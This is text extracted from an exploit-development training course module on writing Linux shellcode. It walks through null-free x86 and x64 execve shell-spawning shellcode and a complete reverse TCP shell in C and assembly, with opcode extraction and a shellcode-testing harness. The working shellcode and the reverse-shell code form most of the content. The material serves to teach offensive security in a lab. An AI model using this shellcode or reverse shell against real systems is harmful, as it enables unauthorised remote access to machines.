4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
However, we were meant to create shellcode and not the 
executable. We can extract shellcode from the executable 
file. Let’s examine the executable with objdump.
|  p.28
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We can see that objdump accurately decompiled the 
executable and that an address was moved to ebx, which is
the address of the „/bin/sh” string.
|  p.29
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
If we examine that string in gdb, we see that it points to 
„/bin/sh”. Also, further memory is not mapped yet hence 
the gdb error.
|  p.30
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Going back to objdump, if we are able to collect the 
opcodes, we can form the shellcode.
|  p.31
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Of course, we don’t want to 
rewrite them one by one. 
Let’s use some handy bash 
oneliners to do it for us. 
Save the script on your 
right as „extractor.sh”.
#!/bin/bash
if [ -z "$1" ] 
then
echo "Usage: $0 <path to 
executable>"
exit
fi
objdump -d $1|grep '[0-9a-f]:'|grep 
-v 'file'|cut -f2 -d:|cut -f1-6 -d' 
'|tr -s ' '|tr '\t' ' '|sed 's/ 
$//g'|sed 's/ /\\x/g'|paste -d '' -s 
|sed 's/^/"/'|sed 's/$/"/g'
|  p.32
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
After using it on the executable, we retrieve the opcodes.
|  p.33
4.2  Basic Linux Shellcode
The above chain of bytes, when put into executable 
memory and when the EIP will be redirected to them, they 
will cause the program to execute the Assembly 
intstructions we coded in the initial file and will spawn 
„/bin/bash”.
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In order to simulate such in-memory placement, we can use 
a special shellcode tester program. This is a commonly 
known code that is widely used for testing shellcode.
|  p.34
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
It allocates the shellcode as raw
bytes in memory. Next, an empy 
function (without any code) 
named ret() is declared. At the 
same time, a pointer to that 
function is assigned a value that 
is equal to the pointer of code. 
This means that now the raw 
shellcode bytes are at the 
location where the ret() function 
starts. Further down, ret is 
executed, so the program 
moves the execution flow to the 
beginning of the shellcode bytes 
and starts to execute them.
#include<stdio.h>
#include<string.h>
unsigned char code[] = ""; //insert shellcode 
here
main()
{
printf("Shellcode Length:  %d\n", 
strlen(code));
int (*ret)() = (int(*)())code;
ret();
}
|  p.35
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Can we then use the shellcode extracted from our 
executable? Not yet. We are about to declare a char array. 
In C, the null byte (0x00) is the string terminator, which also 
works for characters.
|  p.36
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
As the third byte of the shellcode is the null-byte, the 
shellcode tester reads just two characters (until the null 
byte) and then exits.
|  p.37
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The null bytes are there because of the opcodes of specific 
operations; for instance, like „mov reg, 0” which is an
instruction that for sure will generate a null byte.
In order to eliminate null bytes, we will have to restructure 
the code a bit.
|  p.38
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
For example, instead of moving 0 to a register, we will 
use the XOR instruction. XOR is a logical operator, which 
works in the following way:
1 XOR 1 = 0 
1 XOR 0 = 1 
0 XOR 1 = 1 
0 XOR 0 = 0
|  p.39
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Some interesting features of XOR are:
• If you XOR a value with 0, the result will be the initial 
value unchanged.
• If you XOR a value with another value twice, you will get 
the initial value back.
• If you XOR a value with itself, the result will be 0.
|  p.40
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Another shellcode update to eliminate null is by pushing the 
string „/bin/sh” onto the  stack instead of storing it in a 
variable.
Note that as it is a string, it has to end with a null byte and it 
also needs to meet the memory’s reverse order.
|  p.41
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We can push the string as hexadecimal ASCII values –
meaning they will be just numbers. Remember that the 
program does not distinguish data from instructions. 
It is the program creator that tells what should be 
interpreted as data (what its format is) and what should be 
executed.
|  p.42
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
section .text  
global _start; this tell the OS where the program starts
_start:  
xor eax, eax; we zero out EAX. Its value is now 0  
push eax
; We push a null terminated string onto the stack. First comes 0x00000000 from EAX  
push 0x68732f2f; ASCII sh//  
push 0x6e69622f; ASCII nib/
; As the stack is 4-byte aligned, we push /bin//sh, which is 8 letters (8 bytes)
; the additional slash is an alignment.  
mov ebx, esp 
;currently the string /bin/sh is on the top of the stack. As EIP points to the 
top of the stack, we move it to ebx as pointer to the program to be executed  
mov ecx, eax
; eax is still 0 as we didn’t change it. Let's copy the zero to ecx.  
mov al, 0xb
; we move 11 to eax, but we do it by targeting the lowest quarter of EAX. 
this way, we
; use the value 0xb without nulls.  
int 0x80 
; interrupt - execute syscall.
|  p.43
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The new code from the previous slide is compiled in the 
same way as the original code, to receive an ELF file. 
Running the ELF results in a shell.
|  p.44
4.2  Basic Linux Shellcode
Also, there are no null bytes.
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The resulting shellcode can now be pasted into the 
shellcode tester application and compiled with gcc. 
|  p.45
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We also need to specify that we need an executable stack, 
as we will store the „/bin/bash” string there. Otherwise, the 
shellcode-tester would not work and you will receive a
segfault.
|  p.46
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
You are now able to write a null-free, basic execve() 
shellcode that spawns a shell. 
Let’s now try to create something more difficult.
|  p.47
4.2  Basic Linux Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
4.3
Reverse TCP 
Shellcode
|  p.48
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Our next target will be writing a Linux reverse TCP
shellcode.
Before we jump to the Assembly, we need to understand 
what we want to accomplish and what functions need to be 
called before a reverse shell is spawned and working.
|  p.49
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Let’s get to know some Linux internals before creating the 
C program. 
First, in order to create any network connection, from a low 
level perspective, you need a socket. A socket is a virtual 
endpoint used for network communication. It is defined by 
its file descriptor so the system can reference it, and it is 
also defined by its properties, that are set up when the 
socket is created.
|  p.50
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
You can find a full socket properties reference here. One  
example of the properties of a socket is what protocols it 
supports (e.g., IPv4 or LOCAL).
A socket is created by using the socket() function and 
returns the file descriptor (more on it later). The file 
descriptor is a handle that the system can use in order to 
refer to that socket.
http://man7.org/linux/man-pages/man2/socket.2.html
|  p.51
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Upon creation, the socket is not ready for use. It is just a 
stub – literally a socket, that is adjusted to a specific 
protocol type. 
However, it has no location in the network so it cannot be 
accessed by another socket.
|  p.52
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The next thing we will do with the socket is to claim what it 
will be used for. Whether the socket will be used on the 
client or on the server will make a big difference.
If the socket has to be a client socket, we just need to claim 
what address and port it has to connect to. Upon 
successful connection, a two-way communication can be 
started.
|  p.53
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
If it is meant to be a server socket, it must be informed of
what local address and port it will receive. This operation is 
called bind, as the socket is bound to that port and IP
address of a certain interface.
After that, the server socket is put in a listening state. Upon 
an incoming connection, it has to accept() it before the 
bidirectional communication with the client can be started.
|  p.54
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In the case of a reverse shell connection, we will create a 
client socket that will connect to our netcat listener on the 
attacker machine.
Turning our attention back to the socket, it is identified by a 
file descriptor, which is technically a virtual handle used to 
access certain processes I/O operations. 
|  p.55
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
You can access the opened file descriptors for each 
process via /proc/pid/fd/.
In bash you can issue the command „echo $$” to view the 
current PID.
|  p.56
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Each process has default file descriptors connected to the Standard 
Input (stdin – fd0), Standard Output (stdout – fd1) and Standard Error 
(stderr – fd2).
For simplicity, you can think of it in the following way:
•
Input is the data that comes from your keyboard, and that keyboard 
is connected to the stdin. The target program can read from stdin 
and then interpret that input in some way (e.g. bash will execute 
commands).
•
Stdout and stderr are the data coming from the application to the
user. The program decides how to handle any output, in bash stdout
and stderr are delivered to the user via separate channels, but in the 
end both are displayed in the terminal window.
|  p.57
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
On the screenshot below, we can see that the input, output 
and error are linked with terminal no. 6. We also see a file 
descriptor no. 255, which is a Linux internal structure that 
supports the remaining three in case of access failure.
|  p.58
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
File descriptors are unique for each process and are related 
to Input/Output operations. Let’s take a simple exercise 
that will show you how the user can target a specific 
process’s file descriptor and communicate with it.  In a 
newly opened terminal let’s check the process id of itself, 
as follows.
|  p.59
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Then, in another terminal window let’s create a file with 
some content and cat it into the other terminal’s standard 
input.
|  p.60
4.3 Reverse TCP Shellcode
You can see that the file output appears in the second 
terminal.
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We just wrote to its standard input handle, so on the screen 
“111” showed as if someone wrote it with a keyboard to 
that terminal. However, you cannot execute commands this 
way on a foreign terminal unless you are root. Moreover, 
this would require some advanced kernel interactions. This 
is because with that „trick”, you simulate the fact of 
displaying user’s input and not the real input. 
|  p.61
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Why do we need file descriptors when using reverse shell 
sockets? 
Because as we will execute something on a remote 
machine and get its results in either standard input or 
standard output, these data streams will be linked to the 
remote terminal. In order to access them, we would need to 
use the dup2() function to duplicate those descriptors and 
point them to our socket.
|  p.62
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
By duplicating the remote file descriptors, the output (or 
errors) of the executed commands will also be sent to our 
socket, which will send the data over the network to our 
attacking machine.
|  p.63
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
To create a reverse shell shellcode, we need to:
• Create a socket compatible with TCP
• Connect it to the attacker.
• Duplicate the File Descriptors of stdin, stdout and stderr 
back to the reverse shell’s socket; this actually has to be 
done before bash is spawned, otherwise after bash is 
invoked we will not able to access its descriptors.
• Spawn a bash shell.
|  p.64
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Below is the full C code:
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(void)
{
int i; //for later use in fd replication
int sockfd; //this will hold the file descriptor of our socket
struct sockaddr_in sock_addr; // the socket requires passing the target address and port.
//It accepts that data formed into a structure of type sockaddr_in. Before we use that structure, we need to declare it.
//now, we define the elements of the structure that will contain socket properties
sock_addr.sin_family = AF_INET; // address family - internet protocol address (IP)
sock_addr.sin_port = htons( 1234 ); // target port. function htons() converts it to network byte order in similar way as we need to convert data passed to memory to little-
endian
sock_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // target ip, also adjusted to meet network byte order requirements.
// Socket is created and reference to it is held in sockfd variable.
sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
// Socket is put in connect state accordingly to properties set in sock_addr structure
connect(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
// we want to duplicate all the file descriptors related to I/O (so number 0,1,2), and we do it using a loop
for(i = 0; i <= 2; i++)
dup2(sockfd, i);
// spawn the bash shell
execve( "/bin/sh", NULL, NULL );
}
|  p.65
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
As we compile it and set a netcat listener on port 1234, we 
receive a shell upon launching the rev executable.
|  p.66
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
As we now have an idea of what functions we need to call, 
we can do the same in Assembly using syscalls and the 
registers.
|  p.67
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
First, we will use Assembly to create a socket. As we 
cannot specify the verbal, readable values (like AF_INET),
we will need to use their numeric equivalents. 
The numeric equivalents of every parameter is took from 
the syscall documentation, like from here or here.
http://man7.org/linux/man-pages/man2/socketcall.2.html
http://man7.org/linux/man-pages/man2/connect.2.html
|  p.68
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
push 0x66
pop eax ; syscall for sys_socketcall 
xor ebx,ebx
Inc ebx ;we place 1 in ebx for sys_socket argument
xor edx, edx ; edx is zeroed out
push edx ; protocol ipproto_ip
push ebx; socket of type sock_stream
push 0x2; socket family af_inet
mov ecx, esp ; we move the pointer to the freshly pushed arguments into ecx
int 0x80; syscall – socket is created and the result is stored in eax
xchg edx, eax ; we save the result file descriptor in edx as eax will be needed for 
another call
|  p.69
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Next we would like to use the newly created socket and 
establish the TCP connection to the target. In order to do 
so, we need to use the socket call again. Moreover, we 
need to push the whole structure we defined in C onto the 
stack. When everything is set up, we need to set ebx to 0x3 
for the connect syscall. 
Let’s create the Assembly step by step.
|  p.70
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We would like to use the newly created socket and 
establish a TCP connection to the target.
push 0x66
pop eax; we use the same socket call
Now, we need to push the target addresses, which is a bit 
tricky.
|  p.71
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Now we will start to push the socket structure arguments. 
The IP address goes first. We would like to store 127.0.0.1. 
It has to meet the network byte order requirements and 
cannot contain a null byte.
We will write it in reverse order and as a hexadecimal digit:
0x0100007f
|  p.72
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The only problem is that we need to eliminate the null 
bytes. But, as the localhost address has a netmask of 
255.0.0.0, we can as well use 127.1.1.2. 
Thus, we issue the following instruction:
push 0x0201017f; 7f is 127 in hex, and the rest of the 
address is self-explanatory.
|  p.73
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We will then need to push the port number onto the stack. 
Let’s take for example port 1234. Note that you should 
convert it manually to a network byte order.
1234 is equal to 0x04D2 in hex.
In memory it exists in little endian, so in that order 0xD2 
0x04.
This is the value we will push onto the stack.
|  p.74
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We want to push 1234 decimal, which is 0x04D2 in hex. So 
we: push word 0xd204
EBX is already 1, and we want to store the AF_INET 
identifier, which is 0x2 in it. Thus, we need to increase it 
once. We will then push just its lower half to avoid nulls.
inc ebx
push word bx
|  p.75
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
All structure members are now on the stack, starting at the top of 
it. So, ESP currently points to that structure. As we need a pointer 
to that structure, we will save esp in ecx, as we did with the
previous syscall that created the socket.
mov ecx, esp
Push 0x10; length of address (addrlen) – 16 decimal
Push ecx; newly saved pointer to sockaddr struct
Push edx; sockfd that was obtained in previous syscall
Mov ecx, esp; again we save the stack pointer in ecx
|  p.76
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The last thing we need to do is to place the connect 
function call id in EBX. As it was already two, we can simply 
increase it again.
inc ebx; now its 0x3 for sys_connect
int 0x80; execute function
|  p.77
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In order to check if 
we are on the right 
track, let’s compile
the following snippet 
that contains the 
code we just 
analyzed.
global _start
section .text
_start:
push 0x66 
pop eax 
xor ebx,ebx
inc ebx
xor edx,edx ;cleanup edx
push edx ;protocol=IPPROTO_IP (0x0)
push ebx ;
socket_type=SOCK_STREAM (0x1)
push 0x2 ;socket_family=AF_INET (0x2)
mov ecx, esp ;save pointer to socket() args
int 0x80 ;exec sys_socket
xchg edx, eax; save result (sockfd) for later usage; ok
push 0x66 
pop eax ;syscall: sys_socketcall + cleanup eax
push 0x0201017f  ;sin_addr=127.1.1.1 (network byte order)
push word 0xd204 ;sin_port=1234 (network byte order)
inc ebx          
push word bx     ;sin_family=AF_INET (0x2)
mov ecx, esp     ;save pointer to sockaddr struct
push 0x10 ;addrlen=16
push ecx  ;pointer to sockaddr
push edx  ;sockfd
mov ecx, esp ;save pointer to sockaddr_in struct
inc ebx ; sys_connect (0x3)
int 0x80 ;exec sys_connect 
|  p.78
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Note, that a netcat listener will be set up on port 1234. The 
result binary makes the connection and segfaults shortly 
afterwards.
|  p.79
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Let’s add the remaining part. As the socket is created, we 
need to reconstruct the file descriptor duplication in 
Assembly. We will also use a loop and make use of the 
sockfd saved in edx.
push 0x2
pop ecx; ecx will be used as loop counter – from 0 to 2.
xchg ebx,edx; we move edx (sockfd) to ebx, as it will be 
needed as an argument during the syscall.
|  p.80
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Loop:
mov al, 0x3f; id of syscall sys_dup2
int 0x80; execute syscall – duplicate the fd
dec ecx; decrement the loop counter which is at
the same time the fd to duplicate
jns loop; SF (Signed Flag) will become True when 
ecx will hit 0.
|  p.81
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In the end, we just need to add 
the familiar execve shellcode, we 
covered previously.
The next two slides contain the 
full Assembly code required to 
create a reverse shell.
mov al, 0x0b
xor ebx, ebx
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx,ecx
mov edx, ecx
int 0x80
|  p.82
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
global _start
section .text
_start:
push 0x66 
pop eax ;syscall
push 0x1
pop ebx 
xor edx,edx 
push edx ;protocol IPPROTO_IP (0x0)
push ebx ;socket_type SOCK_STREAM (0x1)
push 0x2 ;socket_family AF_INET (0x2)
mov ecx, esp 
int 0x80
xchg edx, eax; save result (sockfd) for later usage
mov al, 0x66
push 0x0201017f  ;sin_addr=127.1.1.2 
push word 0xd204 ;sin_port=1234 
inc ebx          
push word bx     ;sin_family=AF_INET (0x2)
mov ecx, esp     ;save pointer to sockaddr struct
push 0x10 ;addrlen=16
push ecx  ;pointer to sockaddr
push edx  ;sockfd
mov ecx, esp 
inc ebx ; sys_connect (0x3)
int 0x80 ;exec sys_connect
|  p.83
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
push 0x2
pop ecx  
xchg ebx,edx 
loop:
mov al, 0x3f ;syscall: sys_dup2 
int 0x80     ;execute sys_dup2
dec ecx
;decrement loop-counter
jns loop     ;as long as SF is not set -> jmp to loop
mov al, 0x0b
xor ebx,ebx
push ebx
push 0x68732f2f;"hs//"
push 0x6e69622f;"nib/"
mov ebx, esp
xor ecx, ecx
mov edx, ecx
int 0x80 
|  p.84
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
As we compile the assembly code, we receive a reverse 
shell executable.
|  p.85
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The last step is to extract the opcodes and copy them to 
the shellcode-tester.
|  p.86
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The shellcode is run and a reverse shell is established.
|  p.87
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
As you saw, writing shellcode is not that difficult; all it 
requires is a clear plan. 
As Linux is written in C, often a C-program can be 
translated to syscalls without many changes, and syscalls 
have simple rules when called from Assembly – specific 
registers have to contain specific arguments.
|  p.88
4.3 Reverse TCP Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. 
|  p.89
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
4.4
x64 Architecture
|  p.90
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In this section we will write basic shellcode that runs on 64-
bit Linux. Before we can do that, let’s also prepare a 
foundation on what are the differences between the x86 
and the x64 architectures.
The 64-bit architecture is the result of technological 
progress in hardware that software had to adjust to.
|  p.91
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The 32-bit architecture offers 32-bit (4 bytes) registers and 
32-bit addresses. This way, the possible address space is 
limited by the 8-bit value.
On 64-bit, the accessible memory is significantly larger. As 
64-bits are 8 bytes, all registers and addresses on 64-bit 
architecture are twice as large.
|  p.92
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Moreover, the number of registers in 64-bit processors has
been increased. As they are also larger, they received a new 
naming convention; all of them start with „R”. So, for 
example, instead of EAX, EBX and ECX there is RAX, RBX 
and RCX. All of them are 64-bits (8bytes) wide.
|  p.93
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The respective parts of a register can be accessed directly.
In the same manner as you could access AH or AX of EAX 
in 32-bit architectures, you can refer to EAX of RAX on 64-
bit architectures.
Apart from that, several new general purpose registers were 
added in order to support more complex operations. 
|  p.94
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
In x64, the following registers exist:
• rax - register a extended
• rbx - register b extended
• rcx - register c extended
• rdx - register d extended
• rbp - register base pointer
• rsp - register stack pointer 
• rsi - register source index 
• rdi - register destination index
https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start
|  p.95
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
And the new registers are:
• r8 - register 8
• r9 - register 9
• r10 - register 10
• r11 - register 11
• r12 - register 12
• r13 - register 13
• r14 - register 14
• r15 - register 15
https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start
|  p.96
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The fact that new registers exist also affects the way that 
functions are being called. No more arguments are pushed 
onto the stack. 
Instead, the first six arguments to a function are passed as 
follows:
• rdi, rsi, rdx, rcx, r8d, r9d
• The remaining arguments are passed via the stack.
|  p.97
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
From an exploit development perspective, all those 
changes cause a new challenge to arise. 
• Such a large address space makes bruteforcing difficult 
or even impossible.
• Ret2Libc and similar attacks are limited, as function 
argumens are not taken from the stack. Before any 
function call, the attacker has to execute some code that 
puts the parameters in the respective registers.
|  p.98
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
When dealing with buffer overflows on x64 systems, you 
might also encounter a situation where the mapped 
address space is limited by a 6-byte hex number. That
means, you will not be able to overwrite the EIP with 
0x4141414142424242. 
The only available address will be 0x0000414243444546, 
so the exploit buffers have to end after overwriting the EIP. 
|  p.99
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Exploiting 64-bit systems is usually related to Return 
Oriented Programming and is considered an advanced 
topic. Later in this course, you will have the opportunity to 
practise exploitation techniques against both insecure and 
hardened x64 Linux systems.
While exploitation on x64 itself is difficult, x64 shellcoding
is much easier in comparison.
|  p.100
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Let’s try to write a 64-bit Linux shellcode. 
In order to run it, we will use an Ubuntu 18 x64 system.
|  p.101
4.4 x64 Architecture
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
4.5
Writing x64 
Shellcode
|  p.102
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
On a 64-bit environment we will still utilize the nasm, gcc 
and binutils packages to build the shellcode.
|  p.103
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
We will also use the same shellcode tester application. This 
time we will write Assembly code for a 64-bit system. 
Note that you can run 32-bit applications on 64-bit systems,
but you cannot run 64-bit applications on 32-bit systems. 
|  p.104
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The Assembly code for a bash-spawning shellcode will be similar 
to the 32-bit version. We will use the execve syscall that starts a 
process, we will place the arguments for it in the respective 
registers and we will then issue the syscall instruction (on x64 
this is replaced with the 0x80 instruction).
First, we will start with the proper syscall. For execve on x64, it is 
59. You can check here.
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
|  p.105
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The arguments didn’t change in x64. Still, the first argument 
is the program to be executed, the second points to its 
arguments and the third points to the environment 
variables of the started program. 
As on the 32-bit shellcode, we can focus just on pointing 
the first argument to „/bin/bash” and leave the two 
remaining ones empty (NULL).
|  p.106
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Before we execute the syscall, we need to put the syscall 
number in RAX, while RDI, RSI and RDX will contain the 
arguments to execve. So, RDI will contain the pointer to 
„/bin/sh”, while RSI will contain a pointer to an array of 
strings (arguments). 
In this case, we will pass no arguments and no environment 
variables to the program we want to start, so the only 
element of that array will be the pointer to the address of 
„/bin/sh”, a nested pointer (pointer to pointer).
|  p.107
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
The last argument, RDX, can be null. 
Let’s start coding the actual Assembly. You will see that it 
is not very different from the x86 version.
|  p.108
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Below you can see the full assembly code with explanation.
section .text
global _start ; we inform the system where the program begins
_start:
xor rdx, rdx ; zero out rdx
push rdx ; push it onto the stack
mov rax, 0x68732f2f6e69622f ; we can push „hs//nib/” as one value, after all it is 64-bit
push rax ; we push it onto the stack, so it lands at some address on the stack
mov rdi, rsp ; that address is where esp points to, so we store it in rdi => pointer to „/bin/sh”
push rdx ; we push 0, as it will be the null termination of the array
push rdi ; the address of „/bin/sh” is pushed onto the stack, it lands under another stack address
mov rsi, rsp ; we store that address into rsi. So rsi contains a pointer to a pointer to „/bin/sh”
xor rax, rax ; zero out eax to keep it clean
mov al, 0x3b ; 59 DEC, we move it to the lowest eax part to avoid nulls.
syscall ; all arguments are set up, syscall time
|  p.109
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Compilation is similar to what we did in x86, apart from the 
fact that we will specify to the compiler that we want to 
produce an x64 executable.
nasm –f elf64 shellcode.asm –o shellcode.o
ld –m elf_x86_64 –s –o shellcode shellcode.o
|  p.110
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Let’s use the extractor.sh script from the x86 section to 
extract the opcodes from the compiled executable. Then 
we will paste them to the shellcode tester program.
"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\
xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
|  p.111
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Here is the full code of the shellcode tester program.
#include<stdio.h>
#include<string.h>
unsigned char code[] = 
"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x
3b\x0f\x05";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();
}
|  p.112
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
Now, we compile it to test whether the shellcode works:
gcc –m64 –z execstack –fno-stack-protector –o shellcode-2 
shellcode-tester.c
|  p.113
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
As you see, shellcoding in x86 and x64 is similar; however,
the Assembly code has to be adjusted to the rules that are 
enforced by the underlying architecture. 
Basically, it is all about invoking the proper syscalls and 
setting the arguments for them in the correct order.
|  p.114
4.5 Writing x64 Shellcode
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will 
practice writing and 
executing Linux 
shellcode.
Linux Shellcoding
|  p.115
Hera Lab
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
References
|  p.116
XDSv1: Section 1, Module 4 - Caendra Inc. © 2019
References
Assembly - Conditions
Flags and conditional jumps
0.5 — Introduction to the compiler, linker, and libraries
https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm
http://www.godevtool.com/GoasmHelp/usflags.htm
https://www.learncpp.com/cpp-tutorial/introduction-to-the-compiler-linker-and-libraries/
http://man7.org/linux/man-pages/man2/socket.2.html
|  p.117
